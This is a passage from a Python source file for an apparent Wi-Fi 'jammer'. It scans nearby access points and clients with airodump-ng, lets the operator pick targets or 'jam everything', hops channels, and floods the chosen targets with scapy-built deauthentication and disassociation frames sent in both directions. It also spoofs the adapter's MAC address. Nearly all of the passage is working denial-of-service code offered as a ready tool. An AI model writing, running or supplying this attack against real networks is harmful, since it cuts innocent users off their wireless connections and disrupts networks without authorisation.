                client_power = parts[3].strip() if len(parts) > 3 else "-1"
                ap_bssid = normalize_mac(parts[5].strip()) if len(parts) > 5 else ""
                probed_essids = parts[6].strip() if len(parts) > 6 else ""

                if ap_bssid and re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', ap_bssid):
                    clients.append({
                        "client_mac": client_mac,
                        "ap_bssid": ap_bssid,
                        "power": client_power,
                        "probed": probed_essids
                    })

    except Exception as e:
        print(f"{c.BRIGHT_YELLOW}[!]{c.RESET} CSV parse error: {e}\n")

    return aps, clients

def select_whitelist(aps, clients):
    global selected_channels, whitelist_mode, selected_mode

    if not aps:
        print(f"{c.BRIGHT_RED}[✗]{c.RESET} No APs found\n")
        return False

    def get_signal_sort_value(ap):
        try:
            return -int(ap["power"])
        except:
            return -100

    aps_sorted = sorted(aps, key=get_signal_sort_value)

    clear_screen()
    print(f"{c.BRIGHT_CYAN}{'═' * 130}{c.RESET}")
    print(f"{c.BOLD}{c.BRIGHT_YELLOW}{f'ACCESS POINTS FOUND ({len(aps_sorted)})'.center(130)}{c.RESET}")
    print(f"{c.BRIGHT_CYAN}{'═' * 130}{c.RESET}\n")

    # Build client mapping
    client_map = {}
    for client in clients:
        ap_bssid = client["ap_bssid"]
        if ap_bssid not in client_map:
            client_map[ap_bssid] = []
        client_map[ap_bssid].append(client)

    # Display APs with clients - NO TREE CHARS, DARKER CLIENT COLORS, "Client" label
    for idx, ap in enumerate(aps_sorted, 1):
        if not ap["essid"] or ap["essid"].strip() == "":
            ssid_display = f"{c.GRAY}<Hidden>{c.RESET}"
            ssid = "<Hidden>"
        else:
            ssid = ap["essid"][:30]
            ssid_display = f"{c.WHITE}{ssid}{c.RESET}"

        vendor = get_vendor(ap["bssid"])[:29]
        vendor_display = f"{c.GRAY}{vendor}{c.RESET}"

        protocol = ap.get("protocol", "Unknown")[:10]
        protocol_color = get_protocol_color(protocol)
        protocol_display = f"{protocol_color}{protocol.ljust(10)}{c.RESET}"

        power_color = get_power_color(ap["power"])

        ap_clients = client_map.get(ap["bssid"], [])
        num_clients = len(ap_clients)
        client_info = f"{c.BRIGHT_CYAN}{num_clients} clients{c.RESET}" if num_clients > 0 else f"{c.GRAY}no clients{c.RESET}"

        # AP line
        print(f"  {c.BRIGHT_CYAN}{str(idx).ljust(4)}{c.RESET} {power_color}{ap['power'].rjust(4)} dBm{c.RESET}  {ssid_display.ljust(40)}  {c.BRIGHT_YELLOW}{ap['bssid'].ljust(18)}{c.RESET}  {vendor_display.ljust(40)}  {protocol_display.ljust(18)}  {c.ORANGE}{ap['channel'].rjust(3)}{c.RESET}  {client_info}")

        # Clients are not displayed in table rows (only count is shown per AP)

    print()
    print(f"  {c.BRIGHT_RED}[1]{c.RESET} Blacklist - Jam ONLY selected")
    print(f"  {c.BRIGHT_GREEN}[2]{c.RESET} Whitelist - Jam ALL except selected")
    print(f"  {c.BRIGHT_YELLOW}[3]{c.RESET} All - Jam everything\n")

    while True:
        try:
            mode = input(f"{c.BRIGHT_CYAN}Select mode [1-3]: {c.RESET}").strip()

            if mode == '3':
                target_aps = aps_sorted
                whitelist_mode = False
                jam_new_channels = True
                selected_mode = '3'  # All mode
            elif mode in ['1', '2']:
                selection = input(f"{c.BRIGHT_CYAN}Enter AP numbers (e.g. 1,3,5 or 1-5): {c.RESET}").strip()
                selected_indices = set()
                for part in selection.split(','):
                    if '-' in part:
                        start, end = map(int, part.split('-'))
                        selected_indices.update(range(start, end + 1))
                    else:
                        selected_indices.add(int(part))

                valid_indices = [i for i in selected_indices if 1 <= i <= len(aps_sorted)]

                if mode == '1':  # Blacklist
                    target_aps = [aps_sorted[i-1] for i in valid_indices]
                    whitelist_mode = True
                    selected_mode = '1'  # Blacklist
                else:  # mode == '2' - Whitelist
                    target_aps = [ap for idx, ap in enumerate(aps_sorted, 1) if idx not in valid_indices]
                    whitelist_mode = False
                    selected_mode = '2'  # Whitelist
            else:
                print(f"{c.BRIGHT_RED}[!]{c.RESET} Invalid choice\n")
                continue

            # COLLECT ONLY ACTIVE CHANNELS
            active_channels = set()
            for ap in target_aps:
                if ap["channel"].isdigit():
                    active_channels.add(int(ap["channel"]))

            for client in clients:
                ap_bssid = client["ap_bssid"]
                for ap in target_aps:
                    if ap["bssid"] == ap_bssid and ap["channel"].isdigit():
                        active_channels.add(int(ap["channel"]))
                        break

            selected_channels = sorted(list(active_channels))

            if not selected_channels:
                print(f"\n{c.BRIGHT_RED}[✗]{c.RESET} No active channels found\n")
                continue

            break
        except ValueError:
            print(f"{c.BRIGHT_RED}[!]{c.RESET} Invalid input\n")
        except KeyboardInterrupt:
            print(f"\n\n{c.BRIGHT_YELLOW}[!]{c.RESET} Aborted\n")
            return False

    print(f"\n{c.BRIGHT_GREEN}[✓]{c.RESET} Targets: {c.BRIGHT_YELLOW}{len(target_aps)}{c.RESET} APs")
    print(f"{c.BRIGHT_GREEN}[✓]{c.RESET} Active channels: {c.BRIGHT_CYAN}{', '.join(map(str, selected_channels))}{c.RESET}")

    if whitelist_mode:
        print(f"{c.BRIGHT_RED}[✓]{c.RESET} Blacklist mode: {c.BRIGHT_RED}ENABLED{c.RESET} - Jamming ONLY selected targets")
    else:
        print(f"{c.BRIGHT_GREEN}[✓]{c.RESET} Whitelist mode: {c.BRIGHT_GREEN}ENABLED{c.RESET} - Jamming ALL except selected")

    print()

    # ═══════════════════════════════════════════════════════════════════════════════
    # CHANNEL MODE SELECTION
    # ═══════════════════════════════════════════════════════════════════════════════
    print(f"{c.BRIGHT_CYAN}{'═' * 80}{c.RESET}")
    print(f"{c.BRIGHT_YELLOW}{c.BOLD}{'CHANNEL MODE'.center(80)}{c.RESET}")
    print(f"{c.BRIGHT_CYAN}{'═' * 80}{c.RESET}")
    print()
    print(f"{c.BOLD}Choose how channels are handled during jamming:{c.RESET}")
    print()
    print(f"  {c.BRIGHT_GREEN}[1]{c.RESET} {c.WHITE}Active channels only{c.RESET}")
    print(f"      {c.GRAY}• Jam ONLY channels discovered during initial scan{c.RESET}")
    print(f"      {c.GRAY}• Channels: {c.BRIGHT_CYAN}{', '.join(map(str, selected_channels))}{c.RESET}")
    print(f"      {c.GRAY}• Recommended for targeted attacks{c.RESET}")
    print()
    print(f"  {c.BRIGHT_CYAN}[2]{c.RESET} {c.WHITE}Active + New channels{c.RESET}")
    print(f"      {c.GRAY}• Jam channels from scan + newly discovered channels{c.RESET}")
    print(f"      {c.GRAY}• AirodumpMonitor continues finding new APs/channels{c.RESET}")
    print(f"      {c.GRAY}• Recommended for maximum coverage{c.RESET}")
    print()

    while True:
        try:
            choice = input(f"{c.BRIGHT_CYAN}Select mode [1-2] or Enter for 1: {c.RESET}").strip()

            if not choice:
                choice = '1'

            if choice == '1':
                jam_new_channels = False
                print(f"{c.BRIGHT_GREEN}[✓]{c.RESET} Mode: {c.GREEN}Active channels only{c.RESET}")
                break
            elif choice == '2':
                jam_new_channels = True
                print(f"{c.BRIGHT_GREEN}[✓]{c.RESET} Mode: {c.BRIGHT_CYAN}Active + New channels{c.RESET}")
                break
            else:
                print(f"{c.BRIGHT_RED}[!]{c.RESET} Invalid choice")
        except KeyboardInterrupt:
            print(f"{c.BRIGHT_YELLOW}[!]{c.RESET} Aborted")
            return False

    print()

    globals()["jam_new_channels"] = jam_new_channels  # Update global
    return target_aps, clients

class AirodumpMonitor(threading.Thread):
    def __init__(self, interface):
        super().__init__(daemon=True)
        self.interface = interface
        self.csv_prefix = "live-scan"
        self.csv_file = f"{self.csv_prefix}-01.csv"
        self.running = True
        self.airodump_proc = None
        self.last_mtime = 0

    def run(self):
        cmd = ['airodump-ng', '--write', self.csv_prefix, '--write-interval', '2',
               '--output-format', 'csv', self.interface]

        try:
            self.airodump_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            while self.running:
                try:
                    if os.path.exists(self.csv_file):
                        current_mtime = os.path.getmtime(self.csv_file)
                        if current_mtime > self.last_mtime:
                            self.last_mtime = current_mtime
                            self.process_csv_update()
                    time.sleep(1)
                except:
                    time.sleep(1)
        except:
            pass

    def process_csv_update(self):
        global selected_channels
        new_aps, new_clients = parse_csv(self.csv_file)

        with lock:
            for ap_data in new_aps:
                bssid = ap_data['bssid']
                channel = ap_data['channel']
                essid = ap_data['essid'] if ap_data['essid'] else ""
                protocol = ap_data.get('protocol', 'Unknown')

                if not whitelist_mode or bssid in whitelist_bssids:
                    if not any(ap[0] == bssid for ap in APs):
                        APs.append([bssid, channel, essid])
                        target_stats[bssid] = {
                            'packets': 0,
                            'last_deauth': None,
                            'ssid': essid,
                            'channel': channel,
                            'power': ap_data['power'],
                            'bssid': bssid,
                            'vendor': get_vendor(bssid),
                            'protocol': protocol,
                            'clients': [],
                            'rate_tracker': PacketRateTracker()
                        }
                        log_discovery('AP', bssid, f"{essid if essid else '<Hidden>'} Ch {channel}")
                        # Add channel to selected_channels if jam_new_channels is enabled
                        if jam_new_channels and channel.isdigit():
                            ch = int(channel)
                            if ch not in selected_channels:
                                selected_channels.append(ch)
                                selected_channels.sort()
                    else:
                        if bssid in target_stats:
                            target_stats[bssid]['power'] = ap_data['power']
                            target_stats[bssid]['protocol'] = protocol

            for client_data in new_clients:
                client_mac = client_data['client_mac']
                ap_bssid = client_data['ap_bssid']

                if not whitelist_mode or ap_bssid in whitelist_bssids:
                    if not any(c[0] == client_mac and c[1] == ap_bssid for c in clients_APs):
                        clients_APs.append([client_mac, ap_bssid])

                    if client_mac not in client_stats:
                        client_stats[client_mac] = {
                            'ap': ap_bssid,
                            'packets': 0,
                            'power': client_data['power'],
                            'vendor': get_vendor(client_mac),
                            'last_deauth': None,
                            'rate_tracker': PacketRateTracker()
                        }
                    else:
                        client_stats[client_mac]['power'] = client_data['power']

                    if ap_bssid in target_stats:
                        if client_mac not in target_stats[ap_bssid].get('clients', []):
                            target_stats[ap_bssid].setdefault('clients', []).append(client_mac)

    def stop(self):
        self.running = False
        if self.airodump_proc:
            self.airodump_proc.terminate()
            try:
                self.airodump_proc.wait(timeout=3)
            except:
                self.airodump_proc.kill()

        cleanup_files()

class ChannelHopper(threading.Thread):
    def __init__(self, interface, channels):
        super().__init__(daemon=True)
        self.interface = interface
        self.channels = channels
        self.running = True
        self.current_channel = None
        self.channel_lock = threading.Lock()

    def run(self):
        global monchannel

        while self.running:
            try:
                for channel in self.channels:
                    if not self.running:
                        break

                    try:
                        subprocess.run(['iw', 'dev', self.interface, 'set', 'channel', str(channel)],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=1)

                        with self.channel_lock:
                            self.current_channel = str(channel)
                            monchannel = str(channel)
                    except:
                        pass

                    # SLOWER: 3 seconds per channel (was 1.5s)
                    time.sleep(3.0)
            except:
                time.sleep(1)

    def get_current_channel(self):
        with self.channel_lock:
            return self.current_channel

    def stop(self):
        self.running = False

class ChannelWorker(threading.Thread):
    def __init__(self, worker_id, interface, channel_hopper):
        super().__init__(daemon=True)
        self.worker_id = worker_id
        self.interface = interface
        self.channel_hopper = channel_hopper
        self.running = True

    def run(self):
        global deauth_count, client_deauth_count

        while self.running:
            try:
                current_channel = self.channel_hopper.get_current_channel()
                if not current_channel:
                    time.sleep(0.1)
                    continue

                targets = []
                with lock:
                    for ap in APs:
                        bssid, channel, ssid = ap
                        if str(channel) == str(current_channel):
                            if not whitelist_mode or bssid in whitelist_bssids:
                                targets.append(ap)

                if not targets:
                    time.sleep(0.1)
                    continue

                for ap in targets:
                    bssid = ap[0]

                    try:
                        # BROADCAST DEAUTH (to all clients on AP)
                        deauth_broadcast = RadioTap() / Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid) / Dot11Deauth(reason=deauth_code)
                        sendp(deauth_broadcast, iface=self.interface, count=packets_per_burst, 
                              inter=packet_delay, verbose=0)

                        packets_sent = packets_per_burst

                        if send_disas:
                            disas_broadcast = RadioTap() / Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid) / Dot11Disas(reason=deauth_code)
                            sendp(disas_broadcast, iface=self.interface, count=packets_per_burst, 
                                  inter=packet_delay, verbose=0)
                            packets_sent += packets_per_burst

                        with lock:
                            deauth_count += packets_sent
                            if bssid in target_stats:
                                target_stats[bssid]['packets'] += packets_sent
                                target_stats[bssid]['last_deauth'] = datetime.now()
                                target_stats[bssid]['rate_tracker'].add_packets(packets_sent)

                        # CLIENT DEAUTH (directed to specific clients)
                        ap_clients = []
                        with lock:
                            for client_mac, ap_bssid in clients_APs:
                                if ap_bssid == bssid:
                                    ap_clients.append(client_mac)

                        for client_mac in ap_clients:
                            try:
                                # Client -> AP deauth
                                deauth_client_pkt = RadioTap() / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=deauth_code)
                                sendp(deauth_client_pkt, iface=self.interface, count=packets_per_burst,
                                      inter=packet_delay, verbose=0)

                                # AP -> Client deauth
                                deauth_reverse_pkt = RadioTap() / Dot11(addr1=bssid, addr2=client_mac, addr3=bssid) / Dot11Deauth(reason=deauth_code)
                                sendp(deauth_reverse_pkt, iface=self.interface, count=packets_per_burst,
                                      inter=packet_delay, verbose=0)

                                client_packets = packets_per_burst * 2

                                if send_disas:
                                    # Client -> AP disas
                                    disas_client_pkt = RadioTap() / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / Dot11Disas(reason=deauth_code)
                                    sendp(disas_client_pkt, iface=self.interface, count=packets_per_burst,
                                          inter=packet_delay, verbose=0)

                                    # AP -> Client disas
                                    disas_reverse_pkt = RadioTap() / Dot11(addr1=bssid, addr2=client_mac, addr3=bssid) / Dot11Disas(reason=deauth_code)
                                    sendp(disas_reverse_pkt, iface=self.interface, count=packets_per_burst,
                                          inter=packet_delay, verbose=0)

                                    client_packets += packets_per_burst * 2

                                with lock:
                                    client_deauth_count += client_packets
                                    if client_mac in client_stats:
                                        client_stats[client_mac]['packets'] += client_packets
                                        client_stats[client_mac]['last_deauth'] = datetime.now()
                                        client_stats[client_mac]['rate_tracker'].add_packets(client_packets)
                            except:
                                pass
                    except:
                        pass

                time.sleep(0.05)
            except:
                time.sleep(0.1)

    def stop(self):
        self.running = False

class MultiThreadedJammer:
    def __init__(self, interface, channels, num_workers=3):
        self.interface = interface
        self.channels = channels
        self.num_workers = num_workers
        self.workers = []
        self.channel_hopper = None
        self.running = True

    def start(self):
        self.channel_hopper = ChannelHopper(self.interface, self.channels)
        self.channel_hopper.start()
        time.sleep(0.5)

        for i in range(self.num_workers):
            worker = ChannelWorker(i, self.interface, self.channel_hopper)
            worker.start()
            self.workers.append(worker)

    def stop(self):
        self.running = False
        if self.channel_hopper:
            self.channel_hopper.stop()
        for worker in self.workers:
            worker.stop()

def check_adapter_health():
    global adapter_health
    try:
        result = subprocess.run(['iw', 'dev', mon_iface, 'info'],
                              capture_output=True, timeout=2)
        if result.returncode == 0:
            adapter_health['status'] = 'OK'
            adapter_health['failures'] = 0
            return True
        else:
            adapter_health['failures'] += 1
            return False
    except:
        adapter_health['failures'] += 1
        return False

class AdapterHealthMonitor(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self.running = True

    def run(self):
        while self.running:
            try:
                time.sleep(5)
                check_adapter_health()
            except:
                pass

    def stop(self):
        self.running = False

class KeyboardListener(threading.Thread):
    """Listen for 'f' key to change display filter"""
    def __init__(self):
        super().__init__(daemon=True)
        self.running = True

    def run(self):
        global display_filter

        old_settings = termios.tcgetattr(sys.stdin)
        try:
            tty.setcbreak(sys.stdin.fileno())

            while self.running:
                if select.select([sys.stdin], [], [], 0.05)[0]:
                    key = sys.stdin.read(1).lower()

                    if key == 'f':
                        with filter_lock:
                            display_filter += 1
                            if display_filter > FILTER_CLIENTS_ONLY:
                                display_filter = FILTER_JAMMING_ONLY
        finally:
            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)

    def stop(self):
        self.running = False

def get_filter_name():
    """Get display filter name"""
    with filter_lock:
        if display_filter == FILTER_JAMMING_ONLY:
            return f"{c.BRIGHT_GREEN}Jamming Only{c.RESET}"
        elif display_filter == FILTER_ALL:
            return f"{c.BRIGHT_CYAN}All Devices{c.RESET}"
        elif display_filter == FILTER_APS_ONLY:
            return f"{c.BRIGHT_YELLOW}APs Only{c.RESET}"
        elif display_filter == FILTER_CLIENTS_ONLY:
            return f"{c.BRIGHT_MAGENTA}Clients Only{c.RESET}"
    return "Unknown"

def statistics_display_ansi():
    """Display with filter options - FIXED TILDE PATH"""
    global running, deauth_count, client_deauth_count, monchannel, start_time

    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')

    while running:
        clear_screen()

        # FIXED TILDE PATH
        if VENV_ACTIVE:
            venv_path = sys.prefix.replace(os.path.expanduser('~'), '~')
        else:
            venv_path = "Inactive"

        width = 120
        left_col_width = 80
        right_col_width = 38
        sep = "  "  # Space separator

        print(f"{c.BRIGHT_CYAN}{'═' * width}{c.RESET}")

        venv_status = f"{c.BRIGHT_GREEN}Active{c.RESET}" if VENV_ACTIVE else f"{c.BRIGHT_RED}Inactive{c.RESET}"
        left1 = f"{c.BRIGHT_CYAN}[→]{c.RESET} {c.ORANGE}[{c.RESET}venv{c.ORANGE}]{c.RESET}:  {venv_status} → {c.GRAY}{venv_path}{c.RESET}"
        right1 = f"{c.BRIGHT_CYAN}[→]{c.RESET} {c.ORANGE}[{c.RESET}original MAC{c.ORANGE}]{c.RESET}:  {c.GRAY}{original_mac}{c.RESET}"

        left1_plain = ansi_escape.sub('', left1)
        right1_plain = ansi_escape.sub('', right1)

        left1_padded = left1 + ' ' * (left_col_width - len(left1_plain))
        right1_padded = right1 + ' ' * (right_col_width - len(right1_plain))

        print(f"{left1_padded}{sep}{right1_padded}")

        left2 = f"{c.BRIGHT_CYAN}[→]{c.RESET} {c.ORANGE}[{c.RESET}iface{c.ORANGE}]{c.RESET}: {c.BRIGHT_CYAN}{mon_iface}{c.RESET} - {c.WHITE}({c.RESET}{c.LIGHT_GREEN}Monitor{c.RESET}{c.WHITE}){c.RESET}"
        right2 = f"{c.BRIGHT_CYAN}[→]{c.RESET} {c.ORANGE}[{c.RESET}spoofed MAC{c.ORANGE}]{c.RESET}:   {c.BRIGHT_GREEN}{spoofed_mac}{c.RESET}"

        left2_plain = ansi_escape.sub('', left2)
        right2_plain = ansi_escape.sub('', right2)

        left2_padded = left2 + ' ' * (left_col_width - len(left2_plain))
        right2_padded = right2 + ' ' * (right_col_width - len(right2_plain))

        print(f"{left2_padded}{sep}{right2_padded}")

        print(f"{c.BRIGHT_CYAN}{'═' * width}{c.RESET}")

        runtime = datetime.now() - start_time if start_time else timedelta(0)
        runtime_str = str(runtime).split('.')[0]

        total_packets = deauth_count + client_deauth_count
        packets_per_sec = int(total_packets / max(runtime.total_seconds(), 1))

        ch_num = int(monchannel) if monchannel and monchannel.isdigit() else 0
        ch_display = f"{c.BRIGHT_GREEN}5 {c.WHITE}GHz{c.RESET}" if ch_num in CHANNELS_5GHZ else f"{c.BRIGHT_CYAN}2.4 {c.WHITE}GHz{c.RESET}"

        print(f"{c.BRIGHT_YELLOW}[→]{c.RESET} {c.ORANGE}[{c.RESET}Channel{c.ORANGE}]{c.RESET} {c.ORANGE}{monchannel}{c.RESET} ({ch_display}) {c.BRIGHT_CYAN}║{c.RESET} {c.ORANGE}[{c.RESET}Workers{c.ORANGE}]{c.RESET}: {c.BRIGHT_YELLOW}{num_workers}{c.RESET} {c.BRIGHT_CYAN}║{c.RESET} {c.ORANGE}[{c.RESET}Packets{c.ORANGE}]{c.RESET}: {c.BRIGHT_YELLOW}{total_packets}{c.RESET} [{c.BRIGHT_CYAN}{packets_per_sec}{c.RESET} pkts/s] {c.BRIGHT_CYAN}║{c.RESET} {c.ORANGE}[{c.RESET}Runtime{c.ORANGE}]{c.RESET}: {c.BRIGHT_GREEN}{runtime_str}{c.RESET}")
        print(f"{c.BRIGHT_CYAN}{'═' * width}{c.RESET}\n")

        # FILTER LOGIC
        display_aps = []
        with lock:
            current_mon_ch = str(monchannel) if monchannel else ""
            current_filter = display_filter

            for bssid, stats in target_stats.items():
                if whitelist_mode and bssid not in whitelist_bssids:
                    continue

                ch = str(stats['channel'])
                is_jamming = (ch == current_mon_ch and current_mon_ch != "")

                # Apply filter
                if current_filter == FILTER_JAMMING_ONLY and not is_jamming:
                    continue
                elif current_filter == FILTER_APS_ONLY:
                    pass  # Show all APs
                elif current_filter == FILTER_CLIENTS_ONLY:
                    continue  # Skip APs in clients-only mode

                try:
                    power_val = int(stats['power'])
                except:
                    power_val = -100
                display_aps.append((bssid, stats, power_val, is_jamming))

        display_aps.sort(key=lambda x: x[2], reverse=True)

        if not display_aps and current_filter != FILTER_CLIENTS_ONLY:
            print(f"  {c.GRAY}No targets match current filter...{c.RESET}\n")
        else:
            displayed_count = 0
            for bssid, stats, power_val, is_jamming in display_aps[:MAX_APS_DISPLAY]:
                if not stats['ssid'] or stats['ssid'].strip() == "":
                    ssid = "<Hidden>"
                    ssid_color = c.GRAY
                else:
                    ssid = stats['ssid'][:30]
                    ssid_color = c.BRIGHT_WHITE

                vendor = stats.get('vendor', '<unknown vendor>')[:25]
                protocol = stats.get('protocol', 'Unknown')[:10]
                ch = str(stats['channel'])
                power_str = stats['power']
                pkts_per_sec = stats.get('rate_tracker', PacketRateTracker()).get_rate()

                # PRESERVE ORIGINAL COLORS
                power_color = get_power_color(power_str)
                protocol_color = get_protocol_color(protocol)
                arrow = f" {c.SPRING_GREEN}◀{c.RESET}" if is_jamming else ""

                print(f"  {power_color}{power_str.rjust(4)} dBm{c.RESET}  {ssid_color}{ssid.ljust(25)}{c.RESET} {c.BRIGHT_YELLOW}{bssid.ljust(18)}{c.RESET} {c.GRAY}{vendor.ljust(30)}{c.RESET} {protocol_color}{protocol.ljust(10)}{c.RESET} {c.ORANGE}{str(ch).rjust(3)}{c.RESET} {c.WHITE}{str(pkts_per_sec).rjust(5)} pkts/s{c.RESET}{arrow}")

                displayed_count += 1

                # Show clients if applicable
                if current_filter != FILTER_APS_ONLY:
                    ap_clients = stats.get('clients', [])
                    if ap_clients and (current_filter == FILTER_ALL or is_jamming):
                        displayed_clients = ap_clients[:MAX_CLIENTS_PER_AP]
                        remaining_clients = len(ap_clients) - MAX_CLIENTS_PER_AP

                        with lock:
                            for client_mac in displayed_clients:
                                if client_mac in client_stats:
                                    client_info = client_stats[client_mac]
                                    client_power = client_info.get('power', '-1')
                                    client_vendor = client_info.get('vendor', '<unknown vendor>')[:23]
                                    client_pkts_per_sec = client_info.get('rate_tracker', PacketRateTracker()).get_rate()

                                    client_power_color = c.DARK_GRAY

                                    # "Client" in ESSID column
                                    print(f"  {client_power_color}{client_power.rjust(4)} dBm{c.RESET}  {c.DARK_GRAY}{'Client'.ljust(25)}{c.RESET} {c.DARK_CYAN}{client_mac.ljust(18)}{c.RESET} {c.DARK_GRAY}{client_vendor.ljust(30)}{c.RESET} {''.ljust(10)} {''.ljust(7)} {c.DARK_GRAY}{str(client_pkts_per_sec).rjust(5)} pkts/s{c.RESET}")

                        if remaining_clients > 0:
                            print(f"  {c.GRAY}...and {remaining_clients} more clients{c.RESET}")

            # Show clients-only if filter is FILTER_CLIENTS_ONLY
            if current_filter == FILTER_CLIENTS_ONLY:
                with lock:
                    displayed_clients_count = 0
                    for client_mac, client_info in list(client_stats.items())[:MAX_APS_DISPLAY]:
                        client_power = client_info.get('power', '-1')
                        client_vendor = client_info.get('vendor', '<unknown vendor>')[:23]
                        client_pkts_per_sec = client_info.get('rate_tracker', PacketRateTracker()).get_rate()

                        client_power_color = get_power_color(client_power)

                        print(f"  {client_power_color}{client_power.rjust(4)} dBm{c.RESET}  {c.BRIGHT_CYAN}{'Station'.ljust(25)}{c.RESET} {c.BRIGHT_CYAN}{client_mac.ljust(18)}{c.RESET} {c.GRAY}{client_vendor.ljust(30)}{c.RESET} {''.ljust(10)} {''.ljust(7)} {c.GRAY}{str(client_pkts_per_sec).rjust(5)} pkts/s{c.RESET}")
                        displayed_clients_count += 1

                        if displayed_clients_count >= MAX_APS_DISPLAY:
                            break

                    remaining = len(client_stats) - displayed_clients_count
                    if remaining > 0:
                        print(f"\n  {c.GRAY}...and {remaining} more clients{c.RESET}")

            remaining_aps = len(display_aps) - displayed_count
            if remaining_aps > 0 and current_filter != FILTER_CLIENTS_ONLY:
                print(f"\n  {c.GRAY}...and {remaining_aps} more APs{c.RESET}")

        filter_name = get_filter_name()
        if selected_mode == '1':
            whitelist_status = f"{c.BRIGHT_RED}Blacklist{c.RESET}"
        elif selected_mode == '2':
            whitelist_status = f"{c.BRIGHT_GREEN}Whitelist{c.RESET}"
        else:  # selected_mode == '3'
            whitelist_status = f"{c.BRIGHT_YELLOW}All{c.RESET}"
        total_clients = len(client_stats)

        # Status bar with cyan frame and double-line separators
        print()  # Blank line
        print(f"{c.BRIGHT_CYAN}{'═' * 120}{c.RESET}")
        print(f"{c.GRAY}Press {c.WHITE}Ctrl{c.ORANGE}+{c.WHITE}C{c.GRAY} to stop {c.BRIGHT_CYAN}║{c.GRAY} Press {c.WHITE}F{c.GRAY} to {c.ORANGE}[{c.RESET}Filter{c.ORANGE}]{c.RESET}: {filter_name} {c.BRIGHT_CYAN}║{c.GRAY} {c.ORANGE}[{c.RESET}Mode{c.ORANGE}]{c.RESET}: {whitelist_status} {c.BRIGHT_CYAN}║{c.GRAY} {c.ORANGE}[{c.RESET}APs{c.ORANGE}]{c.RESET}: {c.BRIGHT_MAGENTA}{len(APs)}{c.RESET} {c.BRIGHT_CYAN}║{c.GRAY} {c.ORANGE}[{c.RESET}Clients{c.ORANGE}]{c.RESET}: {c.BRIGHT_MAGENTA}{total_clients}{c.RESET}")
        print(f"{c.BRIGHT_CYAN}{'═' * 120}{c.RESET}")
        time.sleep(1.0)

def stop_handler(sig=None, frame=None):
    global running
    running = False

    print(f"\n\n{c.BRIGHT_YELLOW}[!]{c.RESET} Stopping jammer...\n")

    cleanup_processes()
    cleanup_files()

    try:
        subprocess.run(['service', 'network-manager', 'restart'],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{c.BRIGHT_GREEN}[✓]{c.RESET} Network manager restarted\n")
    except:
        pass

    print(f"[{c.ORANGE}*{c.RESET}] AP packets: {c.BRIGHT_YELLOW}{deauth_count:,}{c.RESET}")
    print(f"[{c.ORANGE}*{c.RESET}] Client packets: {c.BRIGHT_MAGENTA}{client_deauth_count:,}{c.RESET}")
    print(f"[{c.ORANGE}*{c.RESET}] Total packets: {c.BRIGHT_GREEN}{(deauth_count + client_deauth_count):,}{c.RESET}")

    if whitelist_mode:
        print(f"[{c.ORANGE}*{c.RESET}] Whitelist targets: {c.BRIGHT_CYAN}{len(whitelist_bssids)}{c.RESET}")

    print(f"{c.BRIGHT_GREEN}[✓]{c.RESET} Jammer stopped\n")
    sys.exit(0)

def start_jamming(target_aps, clients):
    global running, start_time, num_workers, whitelist_bssids

    for ap in target_aps:
        bssid = ap["bssid"]
        whitelist_bssids.add(bssid)

        channel = ap["channel"]
        essid = ap["essid"] if ap["essid"] else ""
        protocol = ap.get("protocol", "Unknown")

        APs.append([bssid, channel, essid])
        target_stats[bssid] = {
            'packets': 0,
            'last_deauth': None,
            'ssid': essid,
            'channel': channel,
            'power': ap["power"],
            'bssid': bssid,
            'vendor': get_vendor(bssid),
            'protocol': protocol,
            'clients': [],
            'rate_tracker': PacketRateTracker()
        }

    for client in clients:
        client_mac = client["client_mac"]
        ap_bssid = client["ap_bssid"]

        if not whitelist_mode or ap_bssid in whitelist_bssids:
            clients_APs.append([client_mac, ap_bssid])

            client_stats[client_mac] = {
                'ap': ap_bssid,
                'packets': 0,
                'power': client.get("power", "-1"),
                'vendor': get_vendor(client_mac),
                'last_deauth': None,
                'rate_tracker': PacketRateTracker()
            }

            if ap_bssid in target_stats:
                target_stats[ap_bssid].setdefault('clients', []).append(client_mac)

    start_time = datetime.now()

    monitor = AirodumpMonitor(mon_iface)
    monitor.start()
    time.sleep(2)

    health_monitor = AdapterHealthMonitor()
    health_monitor.start()

    keyboard_listener = KeyboardListener()
    keyboard_listener.start()

    jammer = MultiThreadedJammer(mon_iface, selected_channels, num_workers=num_workers)
    jammer.start()
    time.sleep(2)

    signal(SIGINT, stop_handler)

    stats = threading.Thread(target=statistics_display_ansi, daemon=True)
    stats.start()

    try:
        while running:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_handler()

def main():
    global mon_iface, num_workers

    if os.geteuid() != 0:
        print(f"\n{c.BRIGHT_RED}[✗] Root required{c.RESET}")
        print(f"{c.YELLOW}  Run: sudo {sys.argv[0]}{c.RESET}\n")
        sys.exit(1)

    cleanup_processes()
    cleanup_files()

    clear_screen()

    try:
        download_mac_database()
        load_mac_vendors()

        if not select_interface():
            sys.exit(1)

        spoof_mac(mon_iface)

        if not set_monitor_mode(mon_iface):
            sys.exit(1)

        if not select_tx_power():
            sys.exit(1)

        if not configure_deauth_params():
            sys.exit(1)

        if not select_band():
            sys.exit(1)

        clear_screen()
        print(f"{c.BRIGHT_CYAN}{'═' * 80}{c.RESET}")
        print(f"{c.BOLD}{c.BRIGHT_YELLOW}{'MULTI-THREADING'.center(80)}{c.RESET}")
        print(f"{c.BRIGHT_CYAN}{'═' * 80}{c.RESET}\n")

        print(f"{c.BRIGHT_WHITE}Optimized Mode:{c.RESET}")
        print(f"  • 1 dedicated channel hopper thread")
        print(f"  • All workers jam same channel simultaneously")
        print(f"  • Bidirectional deauth + disassociation packets")
        print(f"  • Layer 2 transmission with sendp()")
        print(f"  • {c.BRIGHT_GREEN}CLIENT DEAUTH{c.RESET} - Targets connected clients")
